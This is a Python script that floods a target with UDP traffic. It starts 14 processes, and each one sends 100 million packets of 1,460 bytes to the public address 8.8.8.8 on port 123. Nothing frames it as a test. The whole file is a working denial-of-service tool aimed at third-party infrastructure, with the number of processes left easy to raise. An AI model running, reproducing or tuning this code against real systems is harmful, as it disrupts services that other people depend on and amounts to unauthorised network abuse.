import socket
import multiprocessing
import time

def send_udp_packet(destination_ip, destination_port, message):
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       
        # Send data
        sock.sendto(message.encode(), (destination_ip, destination_port))
        #print(f"UDP packet sent to {destination_ip}:{destination_port}")
       
    except Exception as e:
        print(f"Error occurred: {e}")
       
    finally:
        # Close the socket
        sock.close()

# Define the destination IP and port
destination_ip = "8.8.8.8"
destination_port = 123

def generate_long_string(base_string, length):
    long_string = base_string * (length // len(base_string))
    remainder = length % len(base_string)
    long_string += base_string[:remainder]
    return long_string

# Example usage
base_string = "abcdefghijklmnopqrstuvwxyz"  # Short string
length = 1460  # Length of the long string
message = generate_long_string(base_string, length)



# Send the UDP packet
def task():
    for i in range(100000000):
        send_udp_packet(destination_ip, destination_port, message)


# Variable number of threads
num_threads = 14  # You can set this to any number you need

# Create and start threads
threads = []
for i in range(num_threads):
    thread = multiprocessing.Process(target=task, args=())
    thread.start()
    threads.append(thread)







